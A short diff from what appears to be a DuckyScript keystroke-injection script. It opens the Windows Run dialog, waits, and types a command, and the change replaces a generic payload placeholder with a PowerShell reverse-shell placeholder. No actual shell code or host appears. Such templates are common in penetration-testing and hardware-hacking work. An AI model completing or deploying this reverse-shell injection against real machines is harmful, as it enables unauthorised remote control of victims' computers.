@@ -9,5 +9,5 @@ GUI r
 REM ^^^ opens the run Window
 DELAY 300
 REM ^^^ Delay for 300 milliseconds
-STRINGLN <Payload>
+STRINGLN powershell -c <ReveShell payload>
 REM ^^^ Enter payload
